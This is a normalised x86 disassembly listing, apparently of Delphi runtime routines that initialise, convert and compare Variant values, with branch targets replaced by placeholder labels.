push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_411d3c
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_404608
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4046dc
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_411d74
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_404608
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407f80
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_404718
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407f80
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_404718
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407f80
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_404718
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_40806c
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_404718
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_40806c
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_404718
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412714
jmp r-xdata
sub_412c74
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412cde
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40effc
lea eax [ ebp - 0x10 ]
call [ rw-data ]
cmp [ ebp - 0x10 ] 0xd
je r-xdata
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_405770
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412ce5
lea eax [ ebp - 0x10 ]
call sub_40ecd4
retn
mov dx 0xd
mov ax 0x101
call sub_40e49c
sub_412cec
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
movzx eax [ ebx ]
cmp eax 0xd
jg r-xdata
sub eax 0x101
je r-xdata
je r-xdata
mov edx ebx
mov eax esi
call sub_412c74
jmp r-xdata
sub eax 0x3f08
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_405770
jmp r-xdata
sub eax 0x1
jb r-xdata
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_405770
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax esi
call sub_405758
jmp r-xdata
je r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub eax 0x8
je r-xdata
mov edx esp
mov ax [ ebx ]
call sub_4141e8
test al al
je r-xdata
mov eax esi
call sub_405758
jmp r-xdata
mov dx 0xd
mov ax 0x1
call sub_40e49c
jmp r-xdata
mov ax [ ebx ]
mov dx 0xd
call sub_40e49c
mov eax esi
call sub_405758
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_403228
test al al
jne r-xdata
sub_412db8
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
mov ax [ ebx ]
sub ax 0x1
jb r-xdata
mov eax esi
call sub_405758
jmp r-xdata
je r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0x8
je r-xdata
mov eax esi
call sub_405758
jmp r-xdata
mov dx 0x9
mov ax 0x1
call sub_40e49c
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_405770
jmp r-xdata
sub ax 0x4000
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_405770
jmp r-xdata
jmp r-xdata
mov edx esp
mov ax [ ebx ]
call sub_4141e8
test al al
je r-xdata
mov ax [ ebx ]
mov dx 0x9
call sub_40e49c
mov eax esi
call sub_405758
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_403228
test al al
jne r-xdata
sub_412e64
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_40ec58
mov [ edi ] 0x3
movsx eax bl
mov ax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_412ea0
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x3
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40ec58
sub_412ec0
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x11
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40ec58
sub_412ee0
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x12
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_40ec58
sub_412f00
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x13
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40ec58
sub_412f20
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x10
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40ec58
sub_412f40
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x2
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_40ec58
sub_412f60
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40ec58
sub_412f8c
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x4
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_40ec58
sub_412fb0
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x5
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40ec58
sub_412fdc
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x6
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40ec58
sub_413008
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x7
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40ec58
sub_413034
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_40ec58
sub_413098
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403f40
pop esi
pop ebx
retn
mov eax ebx
call sub_40ec58
sub_4130c4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_4047c8
pop esi
pop ebx
retn
mov eax ebx
call sub_40ec58
sub_4130fc
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0xd
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_405770
pop esi
pop ebx
retn
mov eax ebx
call sub_40ec58
sub_413128
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x9
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_405770
pop esi
pop ebx
retn
mov eax ebx
call sub_40ec58
sub_413154
push ebx
mov ebx eax
and bx 0xfff
cmp bx 0x14
jbe r-xdata
mov eax ebx
pop ebx
retn
cmp bx 0x100
jne r-xdata
call sub_40e538
mov bx 0x8
jmp r-xdata
sub_413178
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41323b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x11 ]
call sub_40effc
cmp [ esi ] 0x101
jne r-xdata
cmp [ ebx ] 0x101
jne r-xdata
lea eax [ ebp - 0x11 ]
call [ rw-data ]
mov edx ebx
lea eax [ ebp - 0x11 ]
mov ecx edi
call sub_413a2c
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413242
lea eax [ ebp - 0x11 ]
call sub_40ecd4
retn
lea eax [ ebp - 0x21 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41320f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x21 ]
call sub_40effc
lea eax [ ebp - 0x21 ]
call [ rw-data ]
lea edx [ ebp - 0x21 ]
lea eax [ ebp - 0x11 ]
mov ecx edi
call sub_413a2c
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x21 ]
call sub_40ecd4
retn
sub_413260
push ebx
push ecx
mov [ esp ] dl
mov bl 0x1
mov edx ecx
sub edx 0xe
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
dec edx
je r-xdata
call sub_40e58c
jmp r-xdata
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
dec edx
sub edx 0x4
jb r-xdata
mov eax ebx
pop edx
pop ebx
retn
mov bl [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
call sub_40e58c
jmp r-xdata
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
jmp r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
mov bl [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
call sub_40e58c
jmp r-xdata
je r-xdata
call sub_40e538
xor eax eax
jmp r-xdata
cmp [ esp ] 0x2
je r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
mov bl [ ecx * 2 + rw-data ]
jmp r-xdata
dec dl
je r-xdata
and eax 0x7f
mov bl [ eax + rw-data ]
jmp r-xdata
mov al 0x1
mov al 0x1
cmp [ esp ] 0x2
jne r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov bl 0x2
jmp r-xdata
cmp [ esp ] 0x2
jne r-xdata
and eax 0x7f
mov bl [ eax + rw-data ]
jmp r-xdata
xor ebx ebx
jmp r-xdata
mov bl 0x1
jmp r-xdata
sub_41335c
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
jle r-xdata
cmp eax [ ebp + 0x8 ]
jbe r-xdata
pop ebp
retn 0x10
mov al 0x1
mov al 0x2
jmp r-xdata
jmp r-xdata
sub_413398
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_4133c0
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_4133e8
push ebp
mov ebp esp
fild [ ebp + 0x10 ]
fild [ ebp + 0x8 ]
fcompp
fnstsw ax
sahf
jbe r-xdata
fild [ ebp + 0x10 ]
fild [ ebp + 0x8 ]
fcompp
fnstsw ax
sahf
jae r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_413414
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx edx
xor edx edx
push ebp
push sub_41346f
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_411fec
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_411fec
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407d10
xor edx edx
call sub_413348
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413476
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f10
retn
sub_413480
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov ax [ esi ]
call sub_413154
movzx eax ax
mov bl [ eax + rw-data ]
mov ax [ edi ]
call sub_413154
movzx eax ax
mov al [ eax + rw-data ]
xor edx edx
mov dl al
xor ecx ecx
mov cl bl
imul ecx ecx 0xb
add ecx rw-data
movzx edx [ ecx + edx ]
cmp edx 0xa
ja r-xdata
call sub_40e538
mov al 0x1
jmp [ edx * 4 + jump_table_4134d1 ]
call sub_40e538
mov al 0x1
jmp r-xdata
mov edx eax
mov eax ebx
call sub_41324c
jmp r-xdata
mov ecx ebp
mov edx eax
mov eax ebx
call sub_413260
jmp r-xdata
mov eax edi
call sub_40f68c
push eax
mov eax esi
call sub_40f68c
pop edx
call sub_413348
jmp r-xdata
mov eax esi
call sub_410150
push edx
push eax
mov eax edi
call sub_410150
push edx
push eax
call sub_41335c
jmp r-xdata
mov eax esi
call sub_410c60
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax edi
call sub_410c60
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_413398
jmp r-xdata
mov eax esi
call sub_4113d0
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax edi
call sub_4113d0
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_4133c0
jmp r-xdata
mov eax esi
call sub_411938
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax edi
call sub_411938
add esp 0xfffffff8
fistp [ esp ]
fwait
call sub_4133e8
jmp r-xdata
mov edx edi
mov eax esi
call sub_413414
jmp r-xdata
mov eax edi
call sub_41074c
and eax 0x7f
push eax
mov eax esi
call sub_41074c
and eax 0x7f
pop edx
call sub_413348
jmp r-xdata
mov edx edi
mov eax esi
mov ecx ebp
call sub_413178
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_41360c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov [ ebp - 0x9 ] 0x1
mov si [ ebx ]
mov eax esi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
test ax ax
jne r-xdata
test si si
jne r-xdata
mov edx [ ebp - 0x4 ]
cmp ax 0x1
jne r-xdata
mov dl 0x1
xor eax eax
call sub_41324c
mov [ ebp - 0x9 ] al
jmp r-xdata
cmp si 0x1
jne r-xdata
xor edx edx
mov al 0x1
call sub_41324c
mov [ ebp - 0x9 ] al
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax esi
call sub_4141e8
test al al
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x2
xor eax eax
call sub_413260
mov [ ebp - 0x9 ] al
jmp r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
call sub_4141e8
test al al
jne r-xdata
mov ecx [ ebp - 0x8 ]
xor edx edx
mov al 0x2
call sub_413260
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
mov edx [ ebp - 0x4 ]
mov ecx 0xb
mov eax [ ebp - 0x14 ]
mov esi [ eax ]
call [ esi + 0x8 ]
test al al
je r-xdata
call sub_40e538
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
mov edx ebx
mov ecx 0xb
mov eax [ ebp - 0x18 ]
mov esi [ eax ]
call [ esi + 0x4 ]
test al al
je r-xdata
call sub_40e538
jmp r-xdata
mov esi [ ebp - 0x4 ]
mov si [ esi ]
mov eax esi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
cmp ax [ ebp - 0xe ]
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4137a5
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebx ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
call sub_40f2c8
mov ax [ ebp - 0x28 ]
and ax 0xfff
cmp ax [ ebx ]
je r-xdata
mov ax [ ebx ]
cmp ax [ ebp - 0xc ]
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax esi
call sub_4141e8
test al al
jne r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413937
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0x4 ]
movzx ecx [ ecx ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40f2c8
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
cmp ax [ ebp - 0x28 ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413895
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xe ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
call sub_40f2c8
mov ax [ ebp - 0x28 ]
cmp ax [ ebp - 0xe ]
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax ebx
mov ecx [ ebp - 0x8 ]
call sub_413480
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40ecd4
retn
call sub_40e448
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413717
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xc ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40f2c8
mov ax [ ebp - 0x28 ]
and ax 0xfff
cmp ax [ ebp - 0xc ]
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov edx ebx
mov ecx 0xb
mov eax [ ebp - 0x18 ]
mov esi [ eax ]
call [ esi + 0x4 ]
test al al
je r-xdata
call sub_40e538
jmp r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x8 ]
call sub_413480
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40ecd4
retn
call sub_40e448
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40ecd4
retn
call sub_40e448
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40ecd4
retn
call sub_40e448
call sub_40e538
mov ax [ ebx ]
cmp ax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4139ed
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xc ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40f2c8
mov ax [ ebp - 0x28 ]
cmp ax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40ecd4
retn
call sub_40e448
sub_413a2c
push esi
push edi
mov si [ eax ]
mov di [ edx ]
cmp si 0x10f
jae r-xdata
cmp si 0x400c
jne r-xdata
cmp di 0x10f
jae r-xdata
cmp di 0x400c
jne r-xdata
mov eax [ eax + 0x8 ]
call sub_413a2c
jmp r-xdata
call sub_413480
pop edi
pop esi
retn
and si 0xfff
cmp si 0x10f
jae r-xdata
mov edx [ edx + 0x8 ]
call sub_413a2c
jmp r-xdata
pop edi
pop esi
retn
call sub_41360c
and di 0xfff
cmp di 0x10f
jae r-xdata
call sub_413480
jmp r-xdata
sub_413c18
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x208 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_413d3e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi ebx
and di 0xfff
cmp di 0x14
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_403f40
jmp r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_403f40
jmp r-xdata
test bh 0x20
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4141e8
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_403f40
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_4041f8
lea ecx [ ebp - 0x208 ]
movzx eax di
mov edx 0x4
call sub_408094
mov ecx [ ebp - 0x208 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_4041f8
lea eax [ ebp - 0x104 ]
push eax
lea edx [ ebp - 0x204 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4030c4
lea eax [ ebp - 0x204 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_40288c
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_404150
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413d45
lea eax [ ebp - 0x208 ]
call sub_403eec
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_4041f8
sub_413d9c
push ebx
push esi
push edi
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_413d8c
mov esi eax
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov bx [ esp + 0x4 ]
cmp bx 0x10f
jae r-xdata
mov edx esp
mov eax ebx
call sub_4141e8
test al al
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor eax eax
lea edx [ esp + 0x4 ]
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
jmp r-xdata
mov al 0x1
jmp r-xdata
mov ax [ esp + 0x4 ]
cmp ax 0x9
je r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0xc ] 0x0
je r-xdata
cmp ax 0xd
jne r-xdata
xor eax eax
jmp r-xdata
sub_413e10
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov eax ebx
call sub_413d8c
push esi
mov esi eax
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax esi
call sub_413d8c
push esi
mov esi eax
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov ax [ esp ]
test ax ax
jne r-xdata
cmp ax 0x1
jne r-xdata
cmp [ esp + 0x10 ] 0x0
sete al
jmp r-xdata
mov ax [ esp + 0x10 ]
sub ax 0x2
jae r-xdata
cmp [ esp + 0x10 ] 0x1
sete al
jmp r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx esi
call sub_414390
sete al
xor eax eax
jmp r-xdata
sub_413eac
push ebx
mov bx [ eax ]
cmp bx 0x400c
jne r-xdata
mov [ edx ] bx
test [ edx + 0x1 ] 0x20
setne bl
test bl bl
je r-xdata
mov eax [ eax + 0x8 ]
call sub_413eac
mov ebx eax
jmp r-xdata
xor eax eax
mov [ ecx ] eax
test [ edx + 0x1 ] 0x40
je r-xdata
mov eax ebx
pop ebx
retn
mov eax [ eax + 0x8 ]
mov [ ecx ] eax
jmp r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
jmp r-xdata
sub_413ef8
add esp 0xfffffff8
test dl dl
je r-xdata
mov ax [ eax ]
and ax 0x2000
cmp ax 0x2000
sete al
pop ecx
pop edx
retn
lea ecx [ esp + 0x4 ]
mov edx esp
call sub_413eac
pop ecx
pop edx
retn
sub_413f34
push esp
fiadd [ eax ]
or [ esi + 0x61 ] dl
jb r-xdata
stc
popad
outsb
je r-xdata
add [ eax ] eax
add [ ebp - 0x3e ] bl
add al 0x0
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
mov ax [ esi ]
call sub_4141e8
test al al
je r-xdata
mov eax eax
mov eax ebx
call sub_414168
mov ax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_413f44
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_413fa5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
